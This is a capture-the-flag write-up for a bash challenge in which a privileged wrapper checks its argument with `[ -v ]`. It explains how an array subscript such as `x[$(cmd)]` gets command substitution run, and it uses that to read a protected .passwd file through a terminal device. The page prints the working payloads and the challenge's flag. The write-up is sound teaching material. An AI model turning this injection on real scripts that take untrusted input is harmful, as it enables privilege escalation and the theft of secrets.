---
layout: default
title: Bash-Quoted-Expression-Injection
---
In this challenge we get similar code to [Bash-Unquoted-Expression-Injection](Bash-Unquoted-Expression-Injection). 

```bash
#!/usr/bin/env bash

#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"

PASS=$(cat .passwd)

if [ ! -v "$1" ]; then
    echo "Try again ,-)"
    exit 1
fi


if test "$1" = "$PASS" 2>/dev/null  ; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi

exit 0
```

However, this time we can see it has different check on the first `if`:
```bash
if [ ! -v "$1" ]; then
    echo "Try again ,-)"
    exit 1
fi
```

Last time it tested with `-z`, to check it isn't zero. Now it checks `-v`, to check if the given input is a variable name that exists in the scope.

we can see the link [https://stackoverflow.com/a/72972332](https://stackoverflow.com/a/72972332) which says it is vulnerable in bash from version 4.3 and later. Using the next payload you can get command execution:
```bash
x[$(touch /tmp/pwned)]
```

Explain, in those version, array element is included as variable, so we test if x[4] is variable.
However, since the key inside the brackets can be arithmetic expression, it can also include command substitutions, which then gives us the command execution.

Since this it is being executed by other user, we don't get the output of the injected command. So, let's check what is our `pts`:
```bash
app-script-ch21@challenge02:~$ ls -la /dev/pts | grep ch21
crw--w----  1 app-script-ch21  tty  136,  3 Mar 11 15:54 3
crw--w----  1 app-script-ch21  tty  136,  4 Mar 11 15:54 4
```

we can see that our exact pts is `/dev/pts/3`.

![Pasted image 20260311165507.png](./images/images/Pasted image 20260311165507.png)

Let's add write permissions to others on our pts:
```bash
chmod o+w /dev/pts/3
```

Now, we can execute the command:
```bash
app-script-ch21@challenge02:~$ ./wrapper 'x[$(whoami > /dev/pts/3)]'
app-script-ch21-cracked
Try again ,-)
```

Okay, let's read the flag:
```bash
app-script-ch21@challenge02:~$ ./wrapper 'x[$(cat .passwd > /dev/pts/3)]'
Qu0t1ng_Is_Not_Enough_298472
Try again ,-)
```

the password is **Qu0t1ng_Is_Not_Enough_298472**
